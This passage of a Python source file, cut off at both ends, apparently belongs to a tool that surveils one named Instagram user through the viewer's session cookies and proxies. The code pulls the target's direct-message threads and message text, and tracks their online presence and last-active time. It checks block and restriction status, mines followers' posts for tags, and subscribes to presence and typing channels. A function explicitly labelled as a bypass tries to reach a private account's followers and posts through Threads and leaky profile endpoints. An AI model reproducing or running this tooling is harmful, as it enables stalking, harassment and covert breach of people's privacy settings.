                            'taken_at': _ts_iso(it.get('taken_at'), 's'),
                            'expiring_at': _ts_iso(it.get('expiring_at'), 's'),
                            'media_type': it.get('media_type'),
                            'image_url': (
                                ((it.get('image_versions2') or {})
                                 .get('candidates') or [{}])[0]
                                .get('url', '')[:120]
                            ),
                        }
                        for it in (reel.get('items') or [])[:10]
                    ]
                    entry['latest_reel_media'] = reel.get('latest_reel_media')
                    entry['latest_reel_media_iso'] = _ts_iso(
                        reel.get('latest_reel_media'), 's')
                                 
                tray = d.get('tray') or []
                if tray:
                    entry['highlight_count'] = len(tray)
                    entry['highlights'] = [
                        {
                            'id': hl.get('id'),
                            'title': hl.get('title'),
                            'reel_id': hl.get('id'),
                            'cover_url': (
                                (hl.get('cover_media') or {})
                                .get('cropped_image_version', {})
                                .get('url', '')[:120]
                            ),
                            'latest_reel_media': _ts_iso(
                                hl.get('latest_reel_media'), 's'),
                        }
                        for hl in tray
                    ]
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                                 
                                                                          
                                           
                                                       
                                                
                                  
    viewer_pk = cookies.get('ds_user_id', '')
    pks_sorted = sorted([str(target_pk), str(viewer_pk)], key=int)

    dm_probes = [
                                                         
        ('d_thread_legacy_sorted',
         f'https://www.instagram.com/api/v1/direct_v2/threads/'
         f'{pks_sorted[0]}_{pks_sorted[1]}/'),
                  
        ('d_thread_legacy_rev',
         f'https://www.instagram.com/api/v1/direct_v2/threads/'
         f'{pks_sorted[1]}_{pks_sorted[0]}/'),
                      
        ('d_thread_i_sorted',
         f'https://i.instagram.com/api/v1/direct_v2/threads/'
         f'{pks_sorted[0]}_{pks_sorted[1]}/'),
                                                                  
        ('d_pending_inbox',
         'https://www.instagram.com/api/v1/direct_v2/pending_inbox/'
         '?visual_message_return_type=unseen&cursor=&direction=older'),
                                                      
        ('d_spam_inbox',
         'https://www.instagram.com/api/v1/direct_v2/spam_inbox/'
         '?visual_message_return_type=unseen'),
                                                       
        ('d_thread_by_participants_group',
         f'https://www.instagram.com/api/v1/direct_v2/threads/'
         f'get_by_participants/?recipient_users=%5B{target_pk}%5D'
         f'&seq_id=0&limit=20&thread_type=private'),
                                                         
        ('d_message_request_hide_state',
         f'https://i.instagram.com/api/v1/direct_v2/'
         f'get_message_request_hide_state/?participant_user_id={target_pk}'),
                                                                     
        ('d_inbox_full_cursor',
         'https://www.instagram.com/api/v1/direct_v2/inbox/'
         '?visual_message_return_type=unseen&persistent_badging=true'
         '&use_unified_inbox=true&fetch_reason=initial_snapshot'
         '&limit=100&cursor='),
                                                              
                                                                   
        ('d_pending_preview',
         'https://i.instagram.com/api/v1/direct_v2/'
         'async_get_pending_requests_preview/?pending_inbox_filters=%5B%5D'),
    ]

    for label, url in _fast_probes(dm_probes):
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                                        
                thread = d.get('thread') or {}
                if thread:
                    entry['thread_id'] = thread.get('thread_id')
                    entry['thread_v2_id'] = thread.get('thread_v2_id')
                    items = thread.get('items') or []
                    entry['message_count'] = len(items)
                    if items:
                        entry['messages'] = [
                            {
                                'item_id': it.get('item_id'),
                                'user_id': it.get('user_id'),
                                'timestamp': _ts_iso(it.get('timestamp'), 'us'),
                                'item_type': it.get('item_type'),
                                'text': it.get('text', '')[:200],
                            }
                            for it in items[:20]
                        ]
                                                          
                inbox = d.get('inbox') or d.get('pending_inbox') or {}
                threads = inbox.get('threads', []) if isinstance(inbox, dict) else []
                target_threads = []
                for t in threads:
                    if any(str(u.get('pk')) == str(target_pk)
                           for u in (t.get('users') or [])):
                        target_threads.append({
                            'thread_id': t.get('thread_id'),
                            'thread_v2_id': t.get('thread_v2_id'),
                            'last_permanent_item_ts': _ts_iso(
                                t.get('last_permanent_item_ts'), 'us'),
                            'item_count': len(t.get('items') or []),
                            'messages': [
                                {
                                    'user_id': it.get('user_id'),
                                    'timestamp': _ts_iso(
                                        it.get('timestamp'), 'us'),
                                    'item_type': it.get('item_type'),
                                    'text': it.get('text', '')[:200],
                                }
                                for it in (t.get('items') or [])[:20]
                            ],
                        })
                if target_threads:
                    entry['target_threads'] = target_threads
                                    
                pending_threads = (d.get('pending_inbox') or {}).get('threads', [])
                if pending_threads:
                    entry['pending_thread_count'] = len(pending_threads)
                    entry['pending_threads_sample'] = [
                        {
                            'thread_id': t.get('thread_id'),
                            'users': [u.get('username') for u in
                                      (t.get('users') or [])[:3]],
                        }
                        for t in pending_threads[:5]
                    ]
                                                                   
                                                                                   
                                                               
                if 'pending_requests_total' in d:
                    entry['pending_requests_total'] = d['pending_requests_total']
                    entry['unread_pending_requests'] = d.get(
                        'unread_pending_requests')
                    entry['notes_preview'] = d.get('notes')
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

    return out


def probe_tag_search_in_cluster(target_pk, target_username, cookies,
                                  cluster_path, bearer_info=None, proxies=None,
                                  max_accounts=30, max_media=12):
    """Cluster hesaplarının medyasında @target_username tagini tara.

    usertags total_count=6 → bu 6 post'u bul. Public bir hesap tarafından
    yapılmış her etiket, target'ın sosyal çevresini ve içeriğini açar:
      - Kim etiketlemiş (gerçek follower/tanıdık)
      - Ne zaman (aktivite timestamp)
      - Nerede (lokasyon varsa)
      - Post içeriği (görsel URL, caption, like/comment sayısı)

    Ayrıca cluster dışı yeni hesaplar için GraphQL v2 (document_id tabanlı)
    ile de deneme yapar.
    """
    h = (_headers_with_bearer(cookies, bearer_info)
         if bearer_info and bearer_info.get('bearer') else _headers(cookies))

                                            
    cluster_users = []
    try:
        with open(cluster_path, encoding='utf-8') as f:
            cluster_data = json.load(f)
        cluster_users = cluster_data.get('users') or []
    except (FileNotFoundError, json.JSONDecodeError):
        pass

    results = {
        'target_pk': str(target_pk),
        'target_username': target_username,
        'cluster_size': len(cluster_users),
        'accounts_scanned': 0,
        'tagged_posts_found': [],
        'mention_accounts': [],                                                     
        'errors': [],
    }

                                                            
    mention_re = re.compile(
        r'@?' + re.escape(target_username) + r'\b', re.IGNORECASE)

    for acc in cluster_users[:max_accounts]:
        acc_pk = acc.get('pk')
        acc_username = acc.get('username', '')
        if not acc_pk:
            continue

                                                                          
        if acc.get('is_private'):
            time.sleep(0.1)
            continue

        url = (f'https://i.instagram.com/api/v1/feed/user/{acc_pk}/'
               f'?count={max_media}&exclude_comment=true')
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            results['errors'].append({'pk': acc_pk, 'error': type(e).__name__})
            time.sleep(0.4)
            continue

        results['accounts_scanned'] += 1
        if r.status_code != 200:
            time.sleep(0.3)
            continue

        try:
            d = r.json()
        except (json.JSONDecodeError, ValueError):
            time.sleep(0.3)
            continue

        for item in (d.get('items') or []):
                                  
            usertags = (item.get('usertags') or {}).get('in') or []
            tagged_pks = [str((t.get('user') or {}).get('pk', ''))
                          for t in usertags]
            tag_hit = str(target_pk) in tagged_pks

                                    
            caption_raw = item.get('caption') or {}
            caption_text = (caption_raw.get('text', '')
                            if isinstance(caption_raw, dict)
                            else str(caption_raw))
            mention_hit = bool(mention_re.search(caption_text))

            if tag_hit or mention_hit:
                media_id = item.get('id') or item.get('pk')
                shortcode = item.get('code')
                entry = {
                    'found_via': ('usertag' if tag_hit else 'mention'),
                    'poster_pk': acc_pk,
                    'poster_username': acc_username,
                    'poster_is_private': acc.get('is_private'),
                    'media_id': str(media_id) if media_id else None,
                    'shortcode': shortcode,
                    'post_url': (f'https://www.instagram.com/p/{shortcode}/'
                                 if shortcode else None),
                    'taken_at': _ts_iso(item.get('taken_at'), 's'),
                    'media_type': item.get('media_type'),
                    'like_count': item.get('like_count'),
                    'comment_count': item.get('comment_count'),
                    'caption': caption_text[:200],
                    'location': ((item.get('location') or {}).get('name')),
                    'image_url': (
                        ((item.get('image_versions2') or {})
                         .get('candidates') or [{}])[0]
                        .get('url', '')[:200]
                    ),
                    'video_url': (
                        ((item.get('video_versions') or [{}])[0])
                        .get('url', '')[:200]
                        if item.get('video_versions') else None
                    ),
                    'usertags_in_post': [
                        {'pk': (t.get('user') or {}).get('pk'),
                         'username': (t.get('user') or {}).get('username')}
                        for t in usertags
                    ],
                    'carousel_media_count': len(item.get('carousel_media') or []),
                }
                results['tagged_posts_found'].append(entry)
                if acc_pk not in [x.get('pk')
                                   for x in results['mention_accounts']]:
                    results['mention_accounts'].append({
                        'pk': acc_pk,
                        'username': acc_username,
                    })

        time.sleep(0.3)

                                                                   
                                                               
    gql_results = []
    for doc_id, label in [
        ('17851374694183129', 'followers_v2'),                            
        ('17874545323012746', 'following_v2'),
        ('12754721431965674', 'mutual_followers_v2'),
    ]:
        import urllib.parse
        variables = urllib.parse.quote(
            json.dumps({'id': str(target_pk), 'first': 50}))
        url = (f'https://www.instagram.com/graphql/query/'
               f'?doc_id={doc_id}&variables={variables}')
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException:
            continue
        if r.status_code == 200:
            try:
                d = r.json()
                user_node = ((d.get('data') or {}).get('user') or {})
                for edge_key in ('edge_followed_by', 'edge_follow',
                                 'edge_mutual_followed_by'):
                    edge = user_node.get(edge_key) or {}
                    if edge:
                        edges = edge.get('edges') or []
                        gql_results.append({
                            'doc_id': doc_id,
                            'label': label,
                            'total_count': edge.get('count'),
                            'items_returned': len(edges),
                            'users': [
                                {'pk': e.get('node', {}).get('id'),
                                 'username': e.get('node', {}).get('username'),
                                 'full_name': e.get('node', {}).get('full_name'),
                                 'is_private': e.get('node', {}).get('is_private')}
                                for e in edges
                            ] if edges else [],
                        })
            except (json.JSONDecodeError, ValueError):
                pass
        time.sleep(0.5)

    results['graphql_doc_id_attempts'] = gql_results

    return results


def probe_cross_platform_bypass(target_pk, target_username, cookies,
                                  bearer_info=None, proxies=None):
    """Cross-platform ve collab bypass teknikleri.

    1. Threads API (threads.net) — IG ile aynı PK paylaşıyor.
       IG private iken Threads public ise:
         - Threads followers (gerçek takipçi listesi)
         - Threads posts (içerik)
         - Threads reposts (IG içeriği repost edilmiş olabilir)

    2. Collab posts — target başka public hesapla collab yapmışsa
       o post public hesap üzerinden erişilebilir.

    3. Web profile JSON parse — __additionalDataLoaded veya _sharedData
       üzerinden media_count, edge_owner_to_timeline_media.count sızıntısı.

    4. xmt token ile Threads deep link içeriği.

    5. Facebook probing is skipped unless an identifier is obtained
       dynamically from data explicitly scoped to this target.
    """
    h = (_headers_with_bearer(cookies, bearer_info)
         if bearer_info and bearer_info.get('bearer') else _headers(cookies))
    out = {}

                                                                          
                                           
                                                                          
    threads_probes = [
        ('th_user_info',
         f'https://www.threads.net/api/v1/users/{target_pk}/info/'),
        ('th_followers',
         f'https://www.threads.net/api/v1/friendships/{target_pk}/followers/'
         f'?count=50&rank_token='),
        ('th_following',
         f'https://www.threads.net/api/v1/friendships/{target_pk}/following/'
         f'?count=50&rank_token='),
        ('th_user_threads',
         f'https://www.threads.net/api/v1/text_post_app/user/{target_pk}/'
         f'text_feed/?count=12'),
        ('th_user_replies',
         f'https://www.threads.net/api/v1/text_post_app/user/{target_pk}/'
         f'profile_replies/?count=12'),
        ('th_graphql_profile',
         f'https://www.threads.net/api/graphql'
         '?lsd=&variables=%7B%22userID%22%3A%22' + str(target_pk) + '%22%7D'
         '&doc_id=23996318473300828'),
                                  
        ('th_web_profile',
         f'https://www.threads.net/@{target_username}/__a=1&__d=dis'),
    ]

    for label, url in _fast_probes(threads_probes):
        th_headers = dict(h)
                                                      
        th_headers['referer'] = 'https://www.threads.net/'
        th_headers['x-ig-app-id'] = '238260118697367'                  
        try:
            r = requests.get(url, headers=th_headers, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue

        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                                 
                u = d.get('user') or {}
                if u and label == 'th_user_info':
                    entry['threads_user'] = {
                        'pk': u.get('pk'),
                        'username': u.get('username'),
                        'full_name': u.get('full_name'),
                        'follower_count': u.get('follower_count'),
                        'following_count': u.get('following_count'),
                        'is_private': u.get('is_private'),
                        'media_count': u.get('media_count'),
                        'biography': u.get('biography'),
                    }
                                 
                users = d.get('users') or []
                if isinstance(users, list) and users:
                    entry['count'] = len(users)
                    entry['users'] = [
                        {'pk': u_.get('pk'), 'username': u_.get('username'),
                         'is_private': u_.get('is_private')}
                        for u_ in users[:50]
                    ]
                       
                items = d.get('items') or d.get('threads') or []
                if items:
                    entry['item_count'] = len(items)
                    entry['posts'] = [
                        {
                            'taken_at': _ts_iso(
                                (it.get('thread_items') or [{}])[0]
                                .get('post', {}).get('taken_at'), 's'),
                            'text': (
                                (it.get('thread_items') or [{}])[0]
                                .get('post', {}).get('caption', {})
                                .get('text', '')[:200]
                                if isinstance(
                                    (it.get('thread_items') or [{}])[0]
                                    .get('post', {}).get('caption'), dict)
                                else ''
                            ),
                            'like_count': (
                                (it.get('thread_items') or [{}])[0]
                                .get('post', {}).get('like_count')
                            ),
                            'media_id': (
                                (it.get('thread_items') or [{}])[0]
                                .get('post', {}).get('id')
                            ),
                        }
                        for it in items[:10]
                    ]
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:400]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                            
                                                                          
    collab_probes = [
        ('collab_coauthored',
         f'https://i.instagram.com/api/v1/feed/user/{target_pk}/'
         f'?count=12&include_coauthors=true'),
        ('collab_search_fb',
         f'https://i.instagram.com/api/v1/fbsearch/places/'
         f'?query=&lat=0&lng=0&count=10'),
                                                                                 
        ('tagged_media_by_tag_name',
         f'https://i.instagram.com/api/v1/tags/{target_username}/sections/'
         f'?tab_type=top&include_persistent=true&next_media_ids=[]'),
    ]

    for label, url in _fast_probes(collab_probes):
        try:
            r = requests.get(url, headers=h, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue
        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys())[:20] if isinstance(d, dict) else None
                                                                             
                sections = d.get('sections') or []
                if sections:
                    all_items = []
                    for sec in sections:
                        for lay in (sec.get('layout_content') or {}).get('medias') or []:
                            all_items.append(lay.get('media') or {})
                    if all_items:
                        entry['tag_feed_count'] = len(all_items)
                        entry['tag_posts'] = [
                            {
                                'media_id': it.get('id') or it.get('pk'),
                                'shortcode': it.get('code'),
                                'post_url': (
                                    f'https://www.instagram.com/p/{it.get("code")}/'
                                    if it.get('code') else None),
                                'taken_at': _ts_iso(it.get('taken_at'), 's'),
                                'poster_pk': (it.get('user') or {}).get('pk'),
                                'poster_username': (it.get('user') or {}).get(
                                    'username'),
                                'caption': (
                                    (it.get('caption') or {}).get('text', '')[:150]
                                    if isinstance(it.get('caption'), dict)
                                    else str(it.get('caption') or '')[:150]
                                ),
                                'like_count': it.get('like_count'),
                            }
                            for it in all_items[:12]
                        ]
                                           
                items = d.get('items') or []
                if items:
                    collab_hits = [it for it in items
                                    if (it.get('coauthor_producers') or [])]
                    entry['total_items'] = len(items)
                    if collab_hits:
                        entry['collab_count'] = len(collab_hits)
                        entry['collab_posts'] = [
                            {
                                'media_id': it.get('id'),
                                'shortcode': it.get('code'),
                                'post_url': (
                                    f'https://www.instagram.com/p/{it.get("code")}/'
                                    if it.get('code') else None),
                                'taken_at': _ts_iso(it.get('taken_at'), 's'),
                                'coauthors': [
                                    c.get('username') for c in
                                    (it.get('coauthor_producers') or [])
                                ],
                            }
                            for it in collab_hits[:5]
                        ]
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                                                                         
                                                                          
    web_probes = [
        ('web_profile_full',
         f'https://www.instagram.com/api/v1/users/web_profile_info/'
         f'?username={target_username}'),
        ('web_shared_data',
         f'https://www.instagram.com/{target_username}/?__a=1&__d=dis'),
    ]

    for label, url in web_probes:
        wh = dict(h)
        wh['accept'] = 'text/html,application/xhtml+xml,application/json,*/*'
        try:
            r = requests.get(url, headers=wh, cookies=cookies,
                             timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            time.sleep(0.3)
            continue
        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                user = ((d.get('data') or d.get('graphql') or {})
                         .get('user') or d.get('user') or {})
                if user:
                    media_edge = (user.get('edge_owner_to_timeline_media') or
                                   user.get('edge_felix_video_timeline') or {})
                    entry['media_count'] = user.get('media_count')
                    entry['edge_media_count'] = media_edge.get('count')
                    entry['follower_count'] = user.get('edge_followed_by', {}).get('count')
                    entry['following_count'] = user.get('edge_follow', {}).get('count')
                    entry['is_private'] = user.get('is_private')
                    entry['biography'] = user.get('biography', '')[:200]
                                             
                    edges = media_edge.get('edges') or []
                    if edges:
                        entry['media_items_leaked'] = len(edges)
                        entry['media_items'] = [
                            {
                                'shortcode': e.get('node', {}).get('shortcode'),
                                'taken_at': _ts_iso(
                                    e.get('node', {}).get('taken_at_timestamp'), 's'),
                                'thumb': e.get('node', {}).get(
                                    'thumbnail_src', '')[:120],
                                'like_count': e.get('node', {}).get(
                                    'edge_liked_by', {}).get('count'),
                            }
                            for e in edges[:12]
                        ]
                    entry['raw_user_keys'] = list(user.keys())[:30]
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:400]
        else:
            entry['head'] = r.text[:200]
        out[label] = entry
        time.sleep(0.4)

                                                                          
                                      
                                                                          
                                                                              
                                                                        
                                                              
    out['facebook_cross_platform'] = {
        'attempted': False,
        'reason': 'no_explicit_target_scoped_facebook_id',
        'target_relationship_inferred': False,
    }

    return out


def _save_json(target_username, name, obj):
    path = os.path.join(ARTIFACT_ROOT, target_username, name)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    fd, temp_path = tempfile.mkstemp(
        prefix=f'.{os.path.basename(name)}.', suffix='.tmp',
        dir=os.path.dirname(path))
    try:
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            json.dump(obj, f, indent=2, ensure_ascii=False, default=str)
            f.flush()
            os.fsync(f.fileno())
        os.replace(temp_path, path)
    except Exception:
        try:
            os.unlink(temp_path)
        except OSError:
            pass
        raise
    return path


def _save_raw(target_username, name, text):
    path = os.path.join(ARTIFACT_ROOT, target_username, name)
    os.makedirs(os.path.dirname(path), exist_ok=True)
    fd, temp_path = tempfile.mkstemp(
        prefix=f'.{os.path.basename(name)}.', suffix='.tmp',
        dir=os.path.dirname(path))
    try:
        with os.fdopen(fd, 'w', encoding='utf-8') as f:
            f.write(text)
            f.flush()
            os.fsync(f.fileno())
        os.replace(temp_path, path)
    except Exception:
        try:
            os.unlink(temp_path)
        except OSError:
            pass
        raise
    return path


def _ts_iso(ts, unit='s'):
    if not ts:
        return None
    try:
        ts = float(ts)
        if unit == 'ms':
            ts /= 1000
        elif unit == 'us':
            ts /= 1_000_000
        return datetime.datetime.fromtimestamp(
            ts, tz=datetime.timezone.utc).isoformat()
    except (ValueError, OSError, OverflowError):
        return None


                                                                               
                           
                                                                               
                         
                                                                         
                                                        
                                                                     
                                                                            

                                                                       
                                                                        
_PRESENCE_I_IG = [
    ('GET',  'https://i.instagram.com/api/v1/direct_v2/get_presence/'
             '?recipient_user_ids%5B%5D={pk}', None, 'rest_get_bracket'),
    ('GET',  'https://i.instagram.com/api/v1/direct_v2/get_presence/'
             '?recipient_user_ids={pk}', None, 'rest_get'),
    ('POST', 'https://i.instagram.com/api/v1/direct_v2/get_presence/',
     'recipient_user_ids%5B%5D={pk}', 'rest_post'),
    ('POST', 'https://i.instagram.com/api/v1/direct_v2/get_presence_active_now/',
     'recipient_user_ids%5B%5D={pk}', 'active_now'),
]

                                                             
_PRESENCE_WWW = [
                                                            
                                                                    
                                                                          
    ('GET',  'https://www.instagram.com/api/v1/direct_v2/threads/'
             'get_by_participants/?recipient_users=%5B{pk}%5D'
             '&seq_id=0&limit=1&fetch_reason=preload', None,
     'thread_participants'),
                                                              
    ('GET',  'https://i.instagram.com/api/v1/friendships/show/{pk}/',
     None, 'friendship_show'),
]

PRESENCE_REST_VARIANTS = _PRESENCE_I_IG + _PRESENCE_WWW


def probe_presence_rest(target_pk, cookies, bearer_info=None, proxies=None):
    intel = {}
    base_headers = _headers(cookies)
    bearer_headers = (_headers_with_bearer(cookies, bearer_info)
                      if bearer_info and bearer_info.get('bearer')
                      else base_headers)
    for method, url_template, body, label in _fast_probes(
            PRESENCE_REST_VARIANTS, label_index=3):
        url = url_template.replace('{pk}', str(target_pk))
                                                                           
        use_bearer = 'i.instagram.com' in url
        h = dict(bearer_headers if use_bearer else base_headers)
        if method == 'POST':
            h['content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
            payload = body.replace('{pk}', str(target_pk)) if body else ''
            body_str = _signed_prefix(cookies) + ('&' + payload if payload else '')
        else:
            body_str = None
        try:
            if method == 'GET':
                r = requests.get(url, headers=h, cookies=cookies,
                                 timeout=15, proxies=proxies)
            else:
                r = requests.post(url, headers=h, data=body_str, cookies=cookies,
                                  timeout=15, proxies=proxies)
        except requests.exceptions.RequestException as e:
            intel[label] = {'error': type(e).__name__}
            continue
        entry = {'http_status': r.status_code, 'size': len(r.text)}
        if r.status_code == 200:
            try:
                d = r.json()
                entry['raw_keys'] = list(d.keys()) if isinstance(d, dict) else None

                                                 
                up = (d.get('user_presence') or d.get('subscriptions')
                       or d.get('presence') or {})
                tp = up.get(str(target_pk)) if isinstance(up, dict) else None
                if tp:
                    entry['target_presence'] = {
                        'is_active': tp.get('is_active'),
                        'last_activity_at_ms': tp.get('last_activity_at_ms'),
                        'in_threads': tp.get('in_threads'),
                        'last_activity_iso': _ts_iso(
                            tp.get('last_activity_at_ms'), 'ms'),
                    }
                    if tp.get('last_activity_at_ms'):
                        delta = (time.time() * 1000 -
                                  float(tp['last_activity_at_ms'])) / 1000
                        entry['target_presence']['seconds_since_active'] = round(delta)

                                                                         
                if label == 'thread_participants':
                    thread = d.get('thread') or {}
                    users = thread.get('users') or d.get('users') or []
                    for u in users:
                        if str(u.get('pk')) == str(target_pk):
                            entry['target_from_thread'] = {
                                'date_joined': u.get('date_joined'),
                                'date_joined_iso': _ts_iso(u.get('date_joined'), 's'),
                                'is_private': u.get('is_private'),
                                'friendship_status': u.get('friendship_status'),
                            }
                    entry['reachability_statuses'] = d.get('reachability_statuses')
                    entry['responsiveness_category'] = d.get('responsiveness_category')
                    entry['is_viewer_unconnected'] = d.get('is_viewer_unconnected')
                    entry['should_show_safety_card'] = d.get('should_show_safety_card')
                    if not tp:
                        tp = True                                      

                                               
                if label == 'friendship_show':
                    entry['friendship'] = {
                        'following': d.get('following'),
                        'followed_by': d.get('followed_by'),
                        'blocking': d.get('blocking'),
                        'blocked_by': d.get('blocked_by'),
                        'incoming_request': d.get('incoming_request'),
                        'outgoing_request': d.get('outgoing_request'),
                        'is_muting_reel': d.get('is_muting_reel'),
                        'is_bestie': d.get('is_bestie'),
                        'is_restricted': d.get('is_restricted'),
                        'is_feed_favorite': d.get('is_feed_favorite'),
                        'subscribed': d.get('subscribed'),
                        'is_eligible_to_subscribe': d.get('is_eligible_to_subscribe'),
                    }
                    tp = True

                entry['present_in_response'] = bool(tp)
            except (json.JSONDecodeError, ValueError):
                entry['parse_error'] = True
                entry['head'] = r.text[:300]
        else:
            entry['head'] = r.text[:200]
                                                                    
            if r.status_code == 400:
                try:
                    ec = r.json().get('content', {}).get('error_code')
                    if ec == 4415001:
                        entry['gated_4415001'] = True
                except Exception:
                    pass
        intel[label] = entry
        time.sleep(0.4)
    return intel


def probe_inbox_thread_for_target(target_pk, cookies, proxies=None):
    headers = _headers(cookies)
    out = {}
                                                                  
    for label, params in [
        ('primary',  'visual_message_return_type=unseen&persistent_badging=true'
                     '&use_unified_inbox=true&fetch_reason=initial_snapshot'),
        ('pending',  'visual_message_return_type=unseen&fetch_reason=manual_refresh'
                     '&filter=pending'),
        ('relevant', 'visual_message_return_type=unseen&filter=relevant'),
    ]:
                                                                             
        url = f'https://www.instagram.com/api/v1/direct_v2/inbox/?{params}'
        try:
            r = requests.get(url, headers=headers, cookies=cookies,
                             timeout=20, proxies=proxies)
        except requests.exceptions.RequestException as e:
            out[label] = {'error': type(e).__name__}
            continue
        entry = {'http_status': r.status_code}
        if r.status_code != 200:
            out[label] = entry
            continue
        try:
            d = r.json()
        except json.JSONDecodeError:
            out[label] = entry
            continue
        threads = (d.get('inbox') or {}).get('threads', [])
        for t in threads:
            users = t.get('users', [])
            if not any(str(u.get('pk')) == str(target_pk) for u in users):
                continue
            entry['thread_id'] = t.get('thread_id')
            entry['thread_v2_id'] = t.get('thread_v2_id')
            entry['last_permanent_item_ts'] = t.get('last_permanent_item_ts')
            entry['last_permanent_item_iso'] = _ts_iso(
                t.get('last_permanent_item_ts'), 'us')
            entry['last_activity_at'] = t.get('last_activity_at')
            entry['last_activity_iso'] = _ts_iso(t.get('last_activity_at'), 'us')
            entry['last_seen_at_per_user'] = {
                str(k): {
                    'ts': v.get('timestamp'),
                    'iso': _ts_iso(v.get('timestamp'), 'us'),
                    'item_id': v.get('item_id'),
                }
                for k, v in (t.get('last_seen_at') or {}).items()
            }
            entry['muted'] = t.get('muted')
            entry['is_pin'] = t.get('is_pin')
            entry['inviter_pk'] = (t.get('inviter') or {}).get('pk')
            entry['marked_as_unread'] = t.get('marked_as_unread')
            entry['vc_muted'] = t.get('vc_muted')
            entry['mentions_muted'] = t.get('mentions_muted')
            li = t.get('last_permanent_item') or {}
            if li:
                entry['last_item_user_pk'] = (li.get('user_id')
                                                or (li.get('user') or {}).get('pk'))
                entry['last_item_type'] = li.get('item_type')
                entry['last_item_text_head'] = (li.get('text') or '')[:100]
            break
        out[label] = entry
    return out


def probe_message_search_for_target(target_pk, target_username, cookies,
                                     proxies=None):
    headers = _headers(cookies)
    url = ('https://www.instagram.com/api/v1/direct_v2/search_secondary/'
            f'?query={target_username}&result_types=%5B%22users%22%5D')
    try:
        r = requests.get(url, headers=headers, cookies=cookies,
                         timeout=15, proxies=proxies)
    except requests.exceptions.RequestException as e:
        return {'error': type(e).__name__}
    out = {'http_status': r.status_code}
    if r.status_code == 200:
        try:
            d = r.json()
            for u in (d.get('users') or []):
                if str(u.get('pk')) == str(target_pk):
                                                                          
                    out['user_in_search'] = {
                        k: u.get(k) for k in (
                            'last_active_status_type', 'social_context',
                            'has_anonymous_profile_picture',
                            'is_in_canada', 'is_in_eu', 'profile_pic_url_hd',
                            'is_using_unified_inbox_for_direct',
                            'is_message_request_url_supported',
                            'reachability_status',
                        ) if k in u
                    }
        except json.JSONDecodeError:
            pass
    return out


def probe_mqtt_presence(target_pk, cookies, timeout_seconds=15):
    """edge-mqtt.facebook.com:443 üzerinden WSS handshake. Modern IG
    presence broadcast'ı mutuallere gate'liyor; bu probe handshake
    state'i + target_pk geçen herhangi bir frame'i kayda alır."""
    out = {'attempted': False}
    try:
        disabled = float(timeout_seconds) <= 0
    except (TypeError, ValueError):
        disabled = True
    if disabled:
        out['skipped'] = 'disabled_by_configuration'
        return out
    try:
        import paho.mqtt.client as mqtt
    except ImportError:
        out['skipped'] = ('paho-mqtt yüklü değil. Kurmak için: '
                            'pip install paho-mqtt')
        return out
    sessionid = cookies.get('sessionid')
    ds_user_id = cookies.get('ds_user_id')
    if not (sessionid and ds_user_id):
        out['skipped'] = 'sessionid/ds_user_id eksik'
        return out

    out['attempted'] = True
    state = {'connected': False, 'rc': None, 'subs': {}}
    received = []
    target_bytes = str(target_pk).encode()

    def on_connect(client, userdata, flags, rc):
        state['connected'] = (rc == 0)
        state['rc'] = rc
        if rc == 0:
            for topic in ('/pp', '/ig_realtime_sub', '/ig_message_sync',
                          '/t_typing', '/ig_sub_iris_response'):
                mid_info = client.subscribe(topic, qos=1)
                state['subs'][topic] = mid_info[0]

    def on_message(client, userdata, msg):
        try:
            payload = bytes(msg.payload)
            if target_bytes in payload:
                received.append({
                    'topic': msg.topic,
                    'payload_len': len(payload),
                    'payload_hex_head': payload[:200].hex(),
                    'payload_text_head': payload[:200].decode(
                        'utf-8', errors='replace'),
                })
        except Exception as e:                                               
            received.append({'callback_error': type(e).__name__})

    try:
        client = mqtt.Client(
            client_id=f'mqttwsclient_{ds_user_id}_{int(time.time()*1000)}',
            protocol=mqtt.MQTTv311, transport='websockets')
        client.tls_set()
        client.ws_set_options(path='/chat',
                                headers={'Cookie':
                                          f'sessionid={sessionid}; '
                                          f'ds_user_id={ds_user_id}'})
                                                                       
                                                                              
                                                                            
                                                                            
        client.username_pw_set(ds_user_id, sessionid)
        client.on_connect = on_connect
        client.on_message = on_message
        client.connect('edge-mqtt.facebook.com', 443, keepalive=60)
        client.loop_start()
        time.sleep(timeout_seconds)
        client.loop_stop()
